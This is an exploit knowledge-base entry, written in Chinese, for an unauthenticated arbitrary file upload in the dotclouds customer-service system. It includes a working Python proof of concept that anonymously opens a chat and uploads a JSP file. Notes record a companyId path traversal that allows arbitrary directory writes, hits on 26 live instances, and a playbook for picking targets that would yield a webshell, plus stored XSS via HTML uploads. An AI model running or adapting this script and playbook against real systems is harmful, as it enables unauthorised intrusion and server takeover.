# 点云客服 dotclouds 访客端未授权 multipart 任意文件上传（net.dotclouds / Spring Boot）

- **code**: 点云客服-dotclouds-访客端未授权-multipart-任意文件上传-net.dotclouds-spring-boot
- **kind**: poc
- **category**: file-upload
- **component**: 点云客服系统（net.dotclouds，Udesk 私有化，Spring Boot）
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-08 在 example-com 靶标实测。**上传点本身在多节点复现**：26 个点云客服实例（9 个 IP：203.0.113.65/203.0.113.138/203.0.113.85/203.0.113.91/203.0.113.48/203.0.113.84/203.0.113.125/203.0.113.20/203.0.113.51）全部命中。
**关键升级（本次新增能力）**：companyId 未做 normalize —— `POST .../sendConvMessageFile` 时把 companyId 填成 `200005/../A7443C3` 或 `../../../B7443C3`，服务端返回的落地路径**原样保留 `../`**，文件真的写到了穿越后的目录；浅穿可用 nginx 回读自验证（GET 该 URL 200 + 正文为刚写入的标记串），深穿（3 个 ..）可逃出 /data 直达根文件系统。fileName 末级名可控：`fileName=a.b/c/d/root` -> `.../customer/<uuid>.b/c/d/root`。
**未能 getshell 的硬约束（别重复投入）**：① 落地路径末尾恒带 `/customer/<uuid>.<ext>`，无法命中固定文件名落地点（/etc/cron.d/<name>、~/.ssh/authorized_keys、/var/spool/cron/crontabs/root、/etc/ld.so.preload）；② 目标主机（node_exporter 实测 Ubuntu 22.04.5 LTS / nginx 1.18.0，x86_64）**无 php-fpm、无独立 Tomcat 服务**；③ /data/ 由 nginx 静态 alias 服务，.jsp/.JSP/.jspx/.php/.phtml/.jsp;.jpg/.jsp..jpg/.jpg/.htaccess 在 15 个节点 × 70 个租户 vhost 交叉回读下**全部原样返回源码不解析**；④ 读侧穿越被 nginx 拦（/data/..%2f..%2f..%2fetc%2fpasswd -> 500）；⑤ actuator/druid/swagger/v2/api-docs/knife4j(doc.html) 在根路径与 /dotclouds/ 前缀下都不存在；⑥ Redis 6379/5379 仅本地监听，外部真实协议 PING 无响应。
**同类目标的正确打法**：先跑本 POC 确认上传点 → 立刻判「谁在服务 /data/」（响应头 Server: nginx + ETag/Last-Modified 且无 X-Application-Context = nginx 静态，必不解析）→ 再用 companyId 穿越做任意目录写入，并优先找**有 php-fpm 或独立 Tomcat/JSP 的目标**（此时 <uuid>.php/jsp 落进 web 根即 getshell）。
- **path**: pocs/点云客服-dotclouds-访客端未授权-multipart-任意文件上传-net.dotclouds-spring-boot/dotclouds_unauth_upload.py
- **tags**: 点云客服,dotclouds,udesk,未授权,文件上传,getshell
- **created_at**: 2026-10-08T13:03:39.097Z
- **found_by**: exploit

## 描述

点云客服（net.dotclouds）访客端 sendConvMessageFile 无鉴权 multipart 任意文件上传：先匿名 createConv 拿 convId，再提交 multipart（必须带 fileName 文本字段），服务端内容与扩展名零校验、原始扩展名保留、落地路径可预测且公开可读。

## 用法

```
1) 改 HOST/IP/PORT/COMPANY（公司 id 常用 200005，亦可 200021/200001）；2) python dotclouds_unauth_upload.py（或 runs/exp_getshell.py）先确认上传点；3) 用返回 data 里的 /data/tmp/... 路径直接 GET 判断是源码还是执行结果（源码含 <% 或 <?php = 该节点必不解析，立即换节点；出现执行结果 = getshell）；4) 升级玩法：见知识库条目「companyId 路径穿越任意目录写入」——把 companyId 填成 ../../.. 形式可逃出 /data 写任意目录，fileName 的「最后一个点之后」部分含 / 时可控制末级文件名。5) 落地后先 GET 判断是源码还是执行结果，再决定是否上马。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""点云客服 net.dotclouds 未授权 multipart 任意文件上传 PoC。

前置（全部匿名，无 token / 无 Cookie）：
  1) POST /dotclouds/chat/conversation/createConv
     body {"companyId":"200005","configId":"200005","fingerprint":"<32位hex>",
           "source":"pc","referer":"直接访问","systemInfo":"Windows10",
           "browserInfo":"Chrome","random":"<同fingerprint>","preGuideQuestion":"",
           "username":"","position":""}
     → 200 {"code":"SUCCESS","data":{"convId":"<uuid32>","customer":{"uid":"<客服uid>"}}}
     ！fingerprint 必须是 32 位 hex（Fingerprint2 风格），带横线的 UUID 会被判 code=FIAL 参数异常
     ！companyId=200005 才有客服可分配；其他值可能返回 code=204 没有分配到客服
  2) POST /dotclouds/chat/conversation/sendConvMessageFile
     Content-Type: multipart/form-data; boundary=----X
     form 字段（顺序）：configId, companyId, fromUser(=fingerprint), convId, toUser(=customer.uid),
       messageId(随机 hex), source=visitor, convType=-2, fileName(=文件名，**必须作为文本字段提交，
       否则返回「不能上传空文件或者文件名不能为空」**), file(文件部件, filename=同 fileName)
     → 200 {"state":true,"code":"SUCCESS",
            "data":"<video ...><source src=\"/data/tmp/<日期>/<companyId>/customer/<uuid>.<原始扩展名>\" ...>"}

服务端对内容与扩展名零校验，原始扩展名保留，落地文件公开可读：
  GET https://<host>/data/tmp/<日期>/<companyId>/customer/<uuid>.<ext>

注意（实测结论）：/data/ 由 nginx 直接作为静态目录 alias 服务，
  .jsp 返回 Content-Type: application/octet-stream + 源码、.php 同理，均不被解析 →
  该上传点**不能直接 getshell**，仅在目标 nginx 把 /data/ 下脚本转发给应用容器时才等价于 webshell。
  .html 会以 text/html 返回（同域存储型 XSS 素材）。
"""
import json, sys, os, uuid
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import rawreq  # 裸 socket 客户端，精确控制 SNI/Host

HOST = 'www.example.com'   # 目标域名（SNI）
IP = '203.0.113.6'             # 目标 IP
PORT = 51010
BOUNDARY = '----RWBoundary7MA4YWxkTrZu0gW'
COMPANY = '200005'


def call(path, body, ctype='application/json;charset=UTF-8'):
    data = rawreq.send(IP, PORT, path, 'POST', {'Content-Type': ctype},
                       json.dumps(body).encode() if isinstance(body, dict) else body,
                       sni=HOST, host_hdr=HOST, timeout=20.0, maxlen=200000)
    txt = data.decode('utf-8', 'ignore')
    i = txt.find('{')
    return json.loads(txt[i:txt.rfind('}') + 1]) if i >= 0 else None


def multipart(fields, filename, content, ctype='image/png'):
    out = []
    for k, v in fields.items():
        out += ['--%s' % BOUNDARY, 'Content-Disposition: form-data; name="%s"' % k, '', str(v)]
    out += ['--%s' % BOUNDARY,
            'Content-Disposition: form-data; name="file"; filename="%s"' % filename,
            'Content-Type: %s' % ctype, '']
    return ('\r\n'.join(out) + '\r\n').encode() + content + ('\r\n--%s--\r\n' % BOUNDARY).encode()


fp = uuid.uuid4().hex
j = call('/dotclouds/chat/conversation/createConv', {
    'companyId': COMPANY, 'configId': COMPANY, 'fingerprint': fp, 'source': 'pc',
    'referer': '直接访问', 'customerUid': '', 'systemInfo': 'Windows10', 'browserInfo': 'Chrome',
    'random': fp, 'preGuideQuestion': '', 'username': '', 'position': ''})
assert j and j.get('code') == 'SUCCESS', j
conv = j['data']['convId']
cust = (j['data'].get('customer') or {}).get('uid')
print('convId=%s toUser=%s' % (conv, cust))

fields = {'configId': COMPANY, 'companyId': COMPANY, 'fromUser': fp, 'convId': conv,
          'toUser': cust, 'messageId': uuid.uuid4().hex, 'source': 'visitor',
          'convType': '-2', 'fileName': 'poc.jsp'}
body = multipart(fields, 'poc.jsp', b'<% out.print("POC"); %>', 'image/png')
j2 = call('/dotclouds/chat/conversation/sendConvMessageFile', body,
          'multipart/form-data; boundary=%s' % BOUNDARY)
print(json.dumps(j2, ensure_ascii=False))

```
